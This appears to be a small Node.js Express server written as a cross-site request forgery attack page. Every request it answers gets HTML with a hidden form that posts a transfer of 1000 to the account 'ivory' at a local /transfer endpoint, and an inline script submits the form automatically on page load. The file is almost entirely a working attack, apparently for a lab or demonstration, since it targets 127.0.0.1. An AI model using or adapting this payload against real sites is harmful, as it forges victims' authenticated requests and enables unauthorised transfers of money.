const express = require('express');
const app = express();

const PORT = 3000;

app.use((req, res) => {
  res.send(`
    <html>
      <body>
        <form id="csrf" action="https://127.0.0.1:8080/transfer" method="POST">
          <input type="hidden" name="user_to" value="ivory">
          <input type="hidden" name="amount" value="1000">
        </form>

        <script>
          document.getElementById("csrf").submit();
        </script>
      </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log("CSRF server running at http://localhost:" + PORT);
});
